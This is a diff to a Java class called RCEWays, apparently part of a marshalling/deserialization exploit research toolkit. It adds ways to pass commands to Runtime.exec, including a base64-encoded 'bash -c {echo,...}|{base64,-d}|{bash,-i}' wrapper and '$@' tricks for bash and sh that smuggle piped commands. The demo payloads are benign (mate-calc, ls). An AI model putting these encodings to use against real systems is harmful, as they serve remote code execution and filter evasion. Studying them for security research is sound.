@@ -9,17 +9,22 @@ import xyz.eki.marshalexp.utils.MiscUtils;
 import xyz.eki.marshalexp.utils.ReflectUtils;
 
 import java.beans.Expression;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
+import java.io.*;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Method;
 import java.lang.reflect.Type;
 import java.util.Arrays;
+import java.util.Base64;
 import java.util.Map;
 
 public class RCEWays {
+    public static void getOutput(Process process) throws Exception{
+        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            System.out.println(line);
+        }
+    }
     public static String inputStreamToString(InputStream in, String charset) throws IOException {
         try {
             if (charset == null) {
@@ -45,6 +50,26 @@ public class RCEWays {
     public static String cmd = "mate-calc";
     public static void case1() throws Exception{
         Runtime.getRuntime().exec(cmd);
+    }
+
+    public static void case1_base64() throws Exception{
+        String encodeString = Base64.getEncoder().encodeToString(cmd.getBytes());
+        String cmd = "bash -c {echo," + encodeString + "}|{base64,-d}|{bash,-i}";
+        Runtime.getRuntime().exec(cmd);
+    }
+
+    public static void case1_bash() throws Exception{
+        cmd = "ls | cat";
+        cmd = "bash -c $@|bash x echo " + cmd;
+        Process exec = Runtime.getRuntime().exec(cmd);
+        getOutput(exec);
+    }
+
+    public static void case1_sh() throws Exception{
+        cmd = "ls | cat";
+        cmd = "sh -c $@|sh . echo " + cmd;
+        Process exec = Runtime.getRuntime().exec(cmd);
+        getOutput(exec);
     }
 
     public static void case2() throws Exception{
@@ -138,6 +163,6 @@ public class RCEWays {
     }
 
     public static void main(String[] args) throws Exception{
-        case7();
+        case1_bash();
     }
 }
